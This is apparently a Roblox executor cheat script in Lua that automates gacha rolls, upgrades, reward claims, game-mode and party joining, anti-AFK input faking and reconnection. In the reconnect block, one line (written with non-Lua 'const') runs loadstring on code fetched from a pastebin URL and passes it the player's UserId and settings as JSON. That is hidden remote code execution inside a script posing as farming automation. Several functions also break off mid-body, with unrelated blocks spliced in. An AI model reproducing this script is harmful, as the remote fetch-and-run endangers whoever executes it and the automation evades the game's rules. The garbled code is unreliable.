    for index96, value152 in ipairs(v25.GachaOrder) do
      local v507 = v28.Shared.Gacha.List[value152]

      if f16(v25.Gachas, value152) and v507 and f13(v507.Map or v507.MapName) then
        local v508 = f6(v28.Shared.MonetizationPolicy.FromPlayer, localPlayer)

        if f6(v28.Shared.Economy.CanSpendRandom, v28.Data, v507.Price, v508) then
          if not f59("Gacha", true) then
            f10("Gacha", f60())
            return
          end

          if v16.LastGacha ~= value152 or not v16.GachaAutoOwned then
            f57("Gacha")
            f6(v28.Scripts.Interface.Gacha.Start, value152)
            v16.LastGacha = value152
          end

          f61(
            "Gacha", f17("Scripts.Interface.Gacha.Default"), v507.Price,
            f6(v28.Utils.PlayerStats.GachaCooldown, v28.Data, localPlayer, value152),
            function() return v28.Data.Gacha[value152] and v28.Data.Gacha[value152].Current end
          )

          f10("Gacha", "Rolling " .. value152)
          return
        end
      end
    end

    v16.LastGacha = nil
    f59("Gacha", false)
    f10("Gacha", "Waiting for selected gacha resources")
  end)

  f12("Progression", 2, function()
    if not v25.Progress then
      f10("Progression", "Disabled")
      return
    end

    local scriptsInterfaceProgressionState = f17("Scripts.Interface.Progression.State")

    for index97, value153 in ipairs(v25.Progressions) do
      if f6(scriptsInterfaceProgressionState.Get, value153).CanUpgrade then
        f7("Progression", "Upgrade", value153)
        f10("Progression", "Upgrading " .. value153)
        return
      end
    end

    f10("Progression", "Waiting for resources or access")
  end)
end

do
  f12("Upgrades", 0.15, function()
    if not v25.Upgrade then
      f10("Upgrades", "Disabled")
      return
    end

    for index98, value154 in ipairs(v25.UpgradeOrder) do
      repeat
        if not f16(v25.Upgrades, value154) then
          break
        end

        local v509, v510 = value154:match("^(.-)|(.+)$")
        local v511 = v28.Shared.Upgrade.List[v509]
        local v512 = v511 and v511.Upgrades[v510]

        if v512 and (not v511.MapName or f13(v511.MapName)) then
          local v513 = f6(v28.Shared.Upgrade.GetCurrentLevel, v509, v510, v28.Data)

          if v513 < v512.MaxLevel then
            local v514 = f6(v28.Shared.Upgrade.GetLevelInformation, v509, v510, v513 + 1)

            if v514
              and v514.Price
              and f6(v28.Shared.Upgrade.GetPriceAmount, v28.Data, v514.Price)
                >= v514.Price.Amount then
              if f11("upgrade:" .. v509 .. ":" .. v510 .. ":" .. v513, 0.6) then
                f7("Upgrade", "Upgrade", v509, v510)
              end

              f10("Upgrades", "Buying " .. v510)
              return
            end
          end
        end
      until true
    end

    f10("Upgrades", "Waiting for resources or maxed")
  end)

  f12("IndexRewards", 2, function()
    if not v25.IndexRewards then
      return
    end

    for key63, value155 in pairs(v28.Shared.Index.Rewards) do
      local v515 = f6(v28.Shared.Index.GetDiscoveredAmount, key63, v28.Data)

      for key64, value156 in pairs(value155.List) do
        if v515 >= value156.Amount
          and not f6(v28.Shared.Index.IsRewardClaimed, key63, value156.Amount, v28.Data)
          and f11("indexClaim:" .. key63 .. ":" .. value156.Amount, 5) then
          f7("IndexRewards", "Claim", key63, value156.Amount)
        end
      end
    end
  end)

  f12("LevelRewards", 2, function()
    if not v25.LevelRewards then
      return
    end

    for key65, value157 in pairs(v28.Shared.PlayerLevel.List.Rewards) do
      if v28.Data.Level.Amount >= value157.Level
        and not v28.Data.Level.Rewards["Level" .. value157.Level]
        and f11("levelClaim:" .. value157.Level, 5) then
        f7("PlayerLevel", "ClaimReward", value157.Level)
      end
    end
  end)

  f12("Stats", 0.5, function()
    if not v25.AutoStats then
      f10("Stats", "Disabled")
      return
    end

    if not v25.StatTarget or not v28.Shared.PlayerLevel.List.Stats[v25.StatTarget] then
      f10("Stats", "Select a stat")
      return
    end

    local v516 = math.max(
      0, math.floor(f6(v28.Shared.PlayerLevel.GetAvailablePoints, v28.Data))
    )

    if v516 == 0 then
      f10("Stats", "Waiting for points · " .. v25.StatTarget)
      return
    end

    if f11("upgradeStat", 3) then
      f7("PlayerLevel", "UpgradeStat", v25.StatTarget, v516)
      f10("Stats", "Assigning " .. v516 .. " points to " .. v25.StatTarget)
    end
  end)

  f12("Rewards", 15, function()
    for index99, value158 in ipairs({ "Achievements", "Quests", "Inbox" }) do
      if v25[value158] then
        f7(value158, "ClaimAll")
      end
    end

    f10("Rewards", "Checking enabled rewards")
  end)

  f12("TimeRewards", 1, function()
    if not v25.TimeRewards then
      return
    end

    local timeRewards = v28.Data.TimeRewards

    for index100, value159 in ipairs(v28.Shared.TimeRewards) do
      if not timeRewards.Claimed[tostring(index100)] and timeRewards.TimePlayed >= value159.Time
        and f11("timeReward:" .. index100, 5) then
        f7("TimeRewards", "Claim", index100)
      end
    end
  end)

  f12("DailyRewards", 1, function()
    if not v25.DailyRewards then
      return
    end

    local dailyRewards = v28.Data.DailyRewards

    local v517 = dailyRewards.Start == 0 and 1
      or math.floor((workspace:GetServerTimeNow() - dailyRewards.Start) / 86400) + 1

    for i12 = 1, math.min(v517, #v28.Shared.DailyRewards) do
      if not dailyRewards.Claimed[tostring(i12)] and f11("dailyReward:" .. i12, 5) then
        f7("DailyRewards", "Claim", i12)
      end
    end
  end)

  f6(function()
    f9(v28.Scripts.General.Parties.SyncEvent, function(p194)
      local party = v16.Party
      v16.Party = p194

      if p194 and p194.GamemodeName == "Culling Game" and p194.Status == "Running"
        and (not party or party.ID ~= p194.ID or party.Status ~= "Running")
        and not v28.Data.Gamemode then
        v16.ModeJoining = os.clock()
        v16.Target = nil
        v16.SpotTargets = {}
        v16.StarVisit = nil
        v16.FruitVisit = nil
        v16.FruitTrip = nil
        v16.StopStarForMode()
      end
    end)

    for index101, value160 in ipairs({
      v28.Scripts.General.Parties.LeftEvent, v28.Scripts.General.Parties.DisbandedEvent,
      v28.Scripts.General.Parties.KickedEvent,
    }) do
      f9(value160, function() v16.Party = nil end)
    end
  end)

  local function f104()
    local v518 = {}

    function v518.window(p195, p196)
      local v519 = math.floor(p196 / 3600) * 3600

      for index102, value161 in ipairs(p195.OpenTimes or {}) do
        local v520 = v519 + value161 * 60

        if v520 > p196 then
          v520 = v520 - 3600
        end

        local v521 = v520 + (p195.EnterTime or 60)

        if p196 >= v520 and p196 < v521 then
          return { Status = "Opened", EntryClosesAt = v521 }
        end
      end

      return { Status = "Closed" }
    end

    function v518.choose(p197, p198, p199)
      for index103, value162 in ipairs(p197 or {}) do
        if value162 == p199 or p198[value162] then
          return value162
        end
      end

      return p199
    end

    return v518
  end

  v16.ModePriority = f104()

  function v16.ModeInvoke(p200, p201, ...)
    local v522 = table.pack(...)
    local v523, v524, v525 = false, false, nil

    local v526 = task.spawn(function()
      v524, v525 = pcall(f8, p200, p201, table.unpack(v522, 1, v522.n))
      v523 = true
    end)

    table.insert(v16.Jobs, v526)
    local v527 = os.clock() + (p200 == "Parties" and p201 == "Browse" and 10 or 4)

    while not v523 and v16.Alive and os.clock() < v527 do
      task.wait(0.1)
    end

    if not v523 then
      pcall(task.cancel, v526)
      return nil, "Request timed out"
    end

    if v524 then
      return v525
    end

    return nil, tostring(v525)
  end

  function v16.CullingPublicCandidates(p202)
    local v528 = {}

    for key66, value163 in pairs(type(p202) == "table" and p202 or {}) do
      if type(value163) == "table" and value163.ID and value163.Visibility == "Public"
        and value163.Status ~= "Running"
        and (not value163.GamemodeName or value163.GamemodeName == "Culling Game")
        and type(value163.MemberOrder) == "table" and tonumber(value163.MaxMembers)
        and #value163.MemberOrder < tonumber(value163.MaxMembers) then
        table.insert(v528, value163)
      end
    end

    local cullingJoinAttempts = v16.CullingJoinAttempts or {}

    table.sort(v528, function(p203, p204)
      local v529, v530 = cullingJoinAttempts[p203.ID] or 0, cullingJoinAttempts[p204.ID] or 0

      if v529 ~= v530 then
        return v529 < v530
      end

      return tostring(p203.ID) < tostring(p204.ID)
    end)

    return v528
  end
end

do
  function v16.CullingPlayerTarget(p205, p206)
    return math.min(
      math.max(1, math.floor(tonumber(p206) or 50)),
      math.max(1, math.floor(tonumber(p205) or 2))
    )
  end

  function v16.ModeSpawnStep()
    local gamemode7, gamemodeSession7 = v28.Data.Gamemode, v28.Data.GamemodeSession

    local v531 = gamemode7 == "Dungeon Easy" and "Dungeon"
      or gamemode7 == "Trial Easy" and "Trial"

    if not v531 or not gamemodeSession7 then
      v16.ModeSpawnPending = nil
      v16.ModeSpawnMode = nil
      v16.ModeSpawnSession = nil

      return
    end

    if not v25[v531 .. "Farm"] or v16.LeavingSession == gamemodeSession7 then
      return
    end

    if v16.ModeSpawnMode == gamemode7 and v16.ModeSpawnSession == gamemodeSession7 then
      return
    end

    local modeSpawnPending = v16.ModeSpawnPending

    if not modeSpawnPending or modeSpawnPending.Mode ~= gamemode7
      or modeSpawnPending.Session ~= gamemodeSession7 then
      modeSpawnPending = {
        Mode = gamemode7,
        Session = gamemodeSession7,
        At = os.clock(),
        Attempts = 0,
      }

      v16.ModeSpawnPending = modeSpawnPending
      v16.Target = nil
      v16.SpotTargets = {}
      v16.StarVisit = nil

      if v16.EndFruitTrip then
        v16.EndFruitTrip()
      end

      v16.FruitVisit = nil
      v16.StopStarForMode()
    end

    if not f14() then
      f10(v531, "Waiting for character before arena Spawn")
      return
    end

    if not modeSpawnPending.SentAt then
      if os.clock() - modeSpawnPending.At < 2 or os.clock() < (modeSpawnPending.RetryAt or 0) then
        return
      end

      modeSpawnPending.Attempts = modeSpawnPending.Attempts + 1
      local v532, v533 = pcall(f7, "Gamemodes", "Recall")

      if not v532 then
        v16.Errors.ModeSpawn = tostring(v533)
        modeSpawnPending.RetryAt = os.clock() + 5
        f10(v531, "Arena Spawn failed · waiting to retry")
        return
      end

      modeSpawnPending.SentAt = os.clock()
      v16.Errors.ModeSpawn = nil
      f10(v531, "Arena Spawn requested · preparing farm")
      return
    end

    if os.clock() - modeSpawnPending.SentAt < 2 then
      return
    end

    v16.ModeSpawnMode = gamemode7
    v16.ModeSpawnSession = gamemodeSession7
    v16.ModeSpawnPending = nil

    f10(v531, "Arena Spawn wait finished · farm released")
  end

  f12("Mode Spawn", 0.1, v16.ModeSpawnStep)

  f12("Culling Spawn", 0.1, function()
    local gamemodeSession8 = v28.Data.GamemodeSession

    if v28.Data.Gamemode ~= "Culling Game" or not gamemodeSession8 then
      v16.CullingSpawnPending = nil
      v16.CullingSpawnSession = nil
      return
    end

    if v16.CullingSpawnSession == gamemodeSession8 then
      return
    end

    if not v16.CullingSpawnPending or v16.CullingSpawnPending.Session ~= gamemodeSession8 then
      v16.CullingSpawnPending = { Session = gamemodeSession8, At = os.clock() }
      v16.Target = nil
      v16.SpotTargets = {}
      v16.StarVisit = nil
      v16.FruitVisit = nil
      v16.FruitTrip = nil
      v16.StopStarForMode()
    end

    local v534 = f14()
    local cullingSpawnPending = v16.CullingSpawnPending

    if not v534 then
      return
    end

    if not cullingSpawnPending.SentAt and os.clock() - cullingSpawnPending.At >= 2 then
      cullingSpawnPending.SentAt = os.clock()
      local v535, v536 = pcall(f7, "Gamemodes", "Recall")

      if not v535 then
        v16.Errors.CullingRecall = tostring(v536)
      end

      f10("Culling", "Spawn requested · preparing farm")
    elseif cullingSpawnPending.SentAt and os.clock() - cullingSpawnPending.SentAt >= 2 then
      v16.CullingSpawnSession = gamemodeSession8
      v16.CullingSpawnPending = nil
      f10("Culling", "Entry wait finished · farm released")
    end
  end)

  f12("Modes", 2, function()
    local v537 = {
      ["Dungeon Easy"] = v25.DungeonEnter,
      ["Trial Easy"] = v25.TrialEnter,
      ["Culling Game"] = v25.Culling or v25.CullingJoinPublic,
    }

    local gamemode8 = v28.Data.Gamemode

    if gamemode8 == "Culling Game" and v16.Party then
      v16.ActiveCullingParty = v16.Party.ID
    end

    if v16.PreviousAutomationMode and not gamemode8 then
      if v16.PreviousAutomationMode == "Culling Game" then
        v16.CompletedCullingParty = v16.ActiveCullingParty
        v16.ActiveCullingParty = nil
      end

      v16.ModeJoining = nil
      v16.LeavingSession = nil
      v16.CullingJoinAttempts = {}
    end

    v16.PreviousAutomationMode = gamemode8

    if gamemode8 then
      v16.ModeJoining = nil
    end

    if v16.ModeJoining then
      if os.clock() - v16.ModeJoining < 12 then
        f10("Mode Priority", "Joining " .. tostring(v16.ModeWinner))
        return
      end

      v16.ModeJoining = nil
    end

    local v538 = {}

    for index104, value164 in ipairs({ "Dungeon Easy", "Trial Easy" }) do
      local v539 = value164 == "Dungeon Easy" and "Dungeon Entry" or "Trial Entry"
      local dungeonEnter

      if value164 == "Dungeon Easy" then
        dungeonEnter = v25.DungeonEnter
      else
        dungeonEnter = v25.TrialEnter
      end

      local v540 = v28.Shared.Gamemodes.List[value164]

      if not dungeonEnter then
        f10(v539, "Auto Enter disabled · Auto Farm alone does not enter")
      elseif value164 == gamemode8 then
        f10(v539, "Inside " .. value164)
      elseif not v540 then
        f10(v539, "Mode definition unavailable")
      elseif not f13(v540.MapName) then
        f10(v539, "Required world is locked")
      end

      if dungeonEnter and v540 and value164 ~= gamemode8 and f13(v540.MapName) then
        local v541 = v16.ModeInvoke("Gamemodes", "Preview", value164)

        if type(v541) ~= "table" then
          v541 = v16.ModePriority.window(v540, workspace:GetServerTimeNow())
        end

        f10(v539, "Entry window: " .. tostring(v541.Status))

        if v541.Status == "Opened" and type(v541.EntryClosesAt) ~= "number" then
          f10(v539, "Preview missing entry deadline")
          v541 = v16.ModePriority.window(v540, workspace:GetServerTimeNow())
        end

        if v541
          and v541.Status == "Opened"
          and workspace:GetServerTimeNow() < v541.EntryClosesAt
          and (not v16.LeftWindows or not v16.LeftWindows[value164]
            or v16.LeftWindows[value164] < v541.EntryClosesAt - (v540.EnterTime or 60)) then
          v538[value164] = true
          f10(v539, "Open · eligible for priority selection")
        elseif v541.Status == "Opened" then
          f10(v539, "Entry expired or already left this window")
        end
      end
    end

    local v542 = {}

    if v25.Culling or v25.CullingJoinPublic then
      local cullingGame = v28.Shared.Gamemodes.List["Culling Game"]
      local v543 = f6(v28.Shared.Gamemodes.GetPrice, cullingGame)

      if v25.CullingJoinPublic and not gamemode8 and not v16.Party and f13(cullingGame.MapName) then
        local v544, v545 = v16.ModeInvoke("Parties", "Browse", "Culling Game")

        if type(v544) ~= "table" then
          v16.Errors.CullingBrowse = v545 or "Browse returned " .. type(v544)
          f10("Culling Browse", v16.Errors.CullingBrowse)
        else
          v16.Errors.CullingBrowse = nil
          v542 = v16.CullingPublicCandidates(v544)
          local count12, count13, count14, count15 = 0, 0, 0, 0

          for key67, value165 in pairs(v544) do
            count12 = count12 + 1

            if type(value165) == "table" then
              if value165.Visibility == "Public" then
                count13 = count13 + 1
              end

              if value165.Status == "Running" then
                count14 = count14 + 1
              end

              if type(value165.MemberOrder) == "table" and tonumber(value165.MaxMembers)
                and #value165.MemberOrder >= tonumber(value165.MaxMembers) then
                count15 = count15 + 1
              end
            end
          end

          f10("Culling Browse", string.format(
            "Listed %d · public %d · running %d · full %d · eligible %d", count12, count13,
            count14, count15, #v542
          ))
        end
      end

      local party2 = f13(cullingGame.MapName)
        and (#v542 > 0
          or v16.Party and v16.Party.GamemodeName == "Culling Game"
          or v25.Culling
            and not v25.CullingJoinPublic
            and (not v543
              or f6(v28.Shared.Gamemodes.GetPriceAmount, v28.Data, v543) >= v543.Amount))

      if v25.CullingJoinPublic and not gamemode8 and not v16.Party and #v542 == 0 then
        f10("Culling", not f13(cullingGame.MapName) and "Required world is locked"
          or v16.Errors.CullingBrowse and "Public party lookup failed · retrying"
          or "No eligible public party · waiting without creating")
      end

      v538["Culling Game"] = party2
    end

    v538.Farm = v25.Farm or v25.AttackEverything or v25.AutoWorldQuest

    if v25.AutoWorldQuest and not v25.Farm and not v25.AttackEverything then
      local current4 = v28.Data.Maps.Current
      local v546 = v28.Shared.Quests.List.Main.List[current4]
      local main3 = v28.Data.Quests.List.Main
      local v547 = v16.QuestLogic.next(v546, main3 and main3.List[current4])
      v538.Farm = v547 ~= "Complete" and v547 ~= "Missing" and v547 ~= "Unsupported"
    end

    local v548 = gamemode8 and v537[gamemode8]
    local v549 = v16.ModePriority.choose(v25.ModeOrder, v538, v548 and gamemode8 or nil)

    if gamemode8 and not v548 then
      v16.ModeWinner = nil
      f10("Mode Priority", "Manual mode · " .. gamemode8)
      return
    end

    v16.ModeWinner = v549

    for index105, value166 in ipairs({ "Dungeon Easy", "Trial Easy" }) do
      if v538[value166] and v549 ~= value166 then
        f10(
          value166 == "Dungeon Easy" and "Dungeon Entry" or "Trial Entry",
          "Open · waiting behind " .. tostring(v549 or "missing ModeOrder entry")
        )
      end
    end

    f10("Mode Priority", v549 and "Selected · " .. v549 or "Waiting for enabled activities")

    if gamemode8 then
      if v549 and v549 ~= gamemode8 then
        v16.LeavingSession = v28.Data.GamemodeSession
        f10("Modes", "Leaving " .. gamemode8 .. " for " .. v549)

        if f11("priority-mode-leave", 5) then
          f7("Gamemodes", "Leave")
        end
      else
        f10("Modes", "Inside " .. gamemode8)
      end

      return
    end

    if v549 == "Farm" or not v549 then
      f10("Modes", v549 == "Farm" and "Farming · waiting for higher-priority modes to open"
        or "Waiting for entry window / tickets")

      return
    end

    if v549 == "Dungeon Easy" or v549 == "Trial Easy" then
      if v16.EndFruitTrip then
        v16.EndFruitTrip()
      end

      v16.FruitVisit = nil
      local v550 = v549 == "Dungeon Easy" and "Dungeon Entry" or "Trial Entry"
      f10(v550, "Requesting entry")

      v16.ModeJoining = os.clock()
      v16.Target = nil
      v16.SpotTargets = {}

      local v551, v552 = pcall(v16.ModeInvoke, "Gamemodes", "Join", v549)

      if not v551 or not v552 then
        v16.ModeJoining = nil
        v16.ModeWinner = nil

        f10(v550, "Entry not confirmed · retrying while open")
        f10("Modes", "Entry not confirmed · retrying while open")

        return
      end

      f10("Modes", "Joining " .. v549)
      return
    end

    if v549 == "Culling Game" then
      local cullingGame2 = v28.Shared.Gamemodes.List["Culling Game"]

      if not f13(cullingGame2.MapName) then
        f10("Modes", "Culling Game world is locked")
        return
      end

      local v553 = f6(v28.Shared.Gamemodes.GetPrice, cullingGame2)

      local v554 = not v553
        or f6(v28.Shared.Gamemodes.GetPriceAmount, v28.Data, v553) >= v553.Amount

      if not v16.Party then
        if v25.CullingJoinPublic then
          v16.CullingJoinAttempts = v16.CullingJoinAttempts or {}

          for index106, value167 in ipairs(v542) do
            if os.clock() - (v16.CullingJoinAttempts[value167.ID] or -10) >= 6 then
              v16.CullingJoinAttempts[value167.ID] = os.clock()
              f7("Parties", "Join", value167.ID)
              f10("Modes", "Joining public Culling · " .. tostring(value167.Difficulty))
              return
            end
          end

          if #v542 > 0 then
            f10("Modes", "Waiting for public party join confirmation")
            return
          end
        end

        if v25.CullingJoinPublic or not v25.Culling then
          f10("Modes", "Waiting for a public Culling party")
          return
        end

        if not v554 then
          f10("Modes", "Waiting for Culling Game ticket")
          return
        end

        if f11("party-create", 15) then
          f7("Parties", "Create", "Culling Game")
        end

        f10("Modes", "Creating Culling Game party")
        return
      end

      if v16.Party.GamemodeName ~= "Culling Game" then
        f10("Modes", "Current party belongs to another mode")
        return
      end

      if v16.Party.Status == "Running" then
        if v16.Party.ID and v16.CompletedCullingParty == v16.Party.ID then
          if f11("party-reset", 5) then
            f7("Parties", "Leave")
          end

          f10("Modes", "Leaving completed Culling party")
        else
          v16.ModeJoining = os.clock()
          f10("Modes", "Culling party started · waiting for mode entry")
        end

        return
      end

      if tostring(v16.Party.Leader) ~= tostring(localPlayer.UserId) then

  function v16.AntiIdle()
    if not v25.AntiAFK or not v16.Alive then
      return
    end

    if v16.AntiIdleBusy then
      return
    end

    v16.AntiIdleBusy = true

    local v590, v591 = pcall(function()
      virtualInputManager:SendKeyEvent(true, Enum.KeyCode.F15, false, game)
      task.wait(0.08)
      virtualInputManager:SendKeyEvent(false, Enum.KeyCode.F15, false, game)
    end)

    local v592, v593 = pcall(function()
      virtualUser:CaptureController()
      local currentCamera2 = workspace.CurrentCamera

      virtualUser:Button2Down(
        Vector2.new(1, 1), currentCamera2 and currentCamera2.CFrame or CFrame.new()
      )

      task.wait(0.1)

      virtualUser:Button2Up(
        Vector2.new(1, 1), currentCamera2 and currentCamera2.CFrame or CFrame.new()
      )
    end)

    v16.AntiIdleBusy = false
    v16.AntiIdleResult = { Keyboard = v590, VirtualUser = v592, At = os.clock() }

    if v590 or v592 then
      v16.Errors.AntiAFK = nil
      f10("AntiAFK", "Activity sent · 30-second cycle")
    else
      v16.Errors.AntiAFK = tostring(v591) .. " / " .. tostring(v593)
      f10("AntiAFK", "Executor blocked simulated input")
    end
  end

  f9(localPlayer.Idled, function()

do
  local queueOnTeleport = queue_on_teleport or queueonteleport or syn and syn.queue_on_teleport

  const QueueResume  = loadstring(game:HttpGet('https://pastebin.com/raw/W5p78BbS'))()

  local function f112()
    if v16.ResumeQueued then
      return
    end

    if type(queueOnTeleport) ~= "function" then
      f10("Reconnect", "Reconnect available · executor cannot resume the script")
      return
    end

    local jsonEncode = httpService:JSONEncode({
      UserId = localPlayer.UserId,
      At = os.time(),
      Settings = v25,
    })

    QueueResume(jsonEncode)
    v16.ResumeQueued = true
  end

  f9(localPlayer.OnTeleport, function(p219)
    if p219 == Enum.TeleportState.Failed then
      v16.Reconnecting = false
      v16.ResumeQueued = false
    elseif v25.Reconnect then
      local v596, v597 = pcall(f112)

      if not v596 then
        v16.Errors.ReconnectResume = tostring(v597)
      end
    end
  end)

  f9(teleportService.TeleportInitFailed, function(p220)
    if p220 == localPlayer then
      v16.Reconnecting = false
      v16.ResumeQueued = false
    end
  end)

  f12("Reconnect", 3, function()
    if not v25.Reconnect then
      f10("Reconnect", v16.ReconnectBlocked or "Disabled")
      return
    end

    v16.ReconnectBlocked = nil

    local robloxPromptGui = coreGui:FindFirstChild("RobloxPromptGui")
      or coreGui:FindFirstChild("robloxPromptGui")

    local v598 = false

    if robloxPromptGui then
      for index113, value178 in ipairs(robloxPromptGui:GetDescendants()) do
        if value178.Name == "ErrorPrompt" and value178:IsA("GuiObject") and value178.Visible then
          local v599 = true
          local parent4 = value178.Parent

          while parent4 and parent4 ~= coreGui do
            if parent4:IsA("GuiObject") and not parent4.Visible then
              v599 = false
            end

            if parent4:IsA("ScreenGui") and not parent4.Enabled then
              v599 = false
            end

            parent4 = parent4.Parent
          end

          if v599 then
            v598 = true
            local v600 = {}

            for index114, value179 in ipairs(value178:GetDescendants()) do
              if value179:IsA("TextLabel") and value179.Text ~= "" then
                table.insert(v600, value179.Text)
              end
            end

            local v601 = table.concat(v600, " | ")

            if not v16.LastDisconnect or v16.LastDisconnect.Message ~= v601 then
              v16.LastDisconnect = {
                Message = v601,
                At = os.time(),
                JobId = game.JobId,
                PlaceId = game.PlaceId,
              }

              v16.LastDisconnect.Enabled = {}

              for key72, value180 in pairs(v25) do
                if value180 == true then
                  table.insert(v16.LastDisconnect.Enabled, key72)
                end
              end

              table.sort(v16.LastDisconnect.Enabled)
              f1("disconnect", v601)

              if type(writefile) == "function" then
                pcall(function()
                  writefile(
                    v311 .. "-last-disconnect.json", httpService:JSONEncode(v16.LastDisconnect)
                  )
                end)
              end
            end

            break
          end
        end
      end
    end

    if not v598 then
      f10("Reconnect", type(queueOnTeleport) == "function"
          and "Monitoring connection · automatic resume ready"
        or "Monitoring connection · automatic resume unavailable")

      return
    end

    if type(game.JobId) ~= "string" or game.JobId == "" then
      f10("Reconnect", "Reconnect stopped: original server ID unavailable")
      return
    end

    if v16.Reconnecting or not f11("ReconnectAttempt", 20) then
      return
    end

    v16.Reconnecting = true
    v16.ReconnectAttempts = (v16.ReconnectAttempts or 0) + 1

    local v602, v603 = pcall(f112)

    if not v602 then
      v16.Errors.ReconnectResume = tostring(v603)
    end

    f10("Reconnect", "Reconnecting · attempt " .. v16.ReconnectAttempts)

    local v604, v605 = pcall(function()
      teleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
    end)

    if not v604 then
      v16.Reconnecting = false
      v16.Errors.Reconnect = tostring(v605)
      f10("Reconnect", "Failed · retrying in 20 seconds")
    end

    task.delay(15, function()
      if v16.Alive then
        v16.Reconnecting = false
      end
    end)
  end)
end
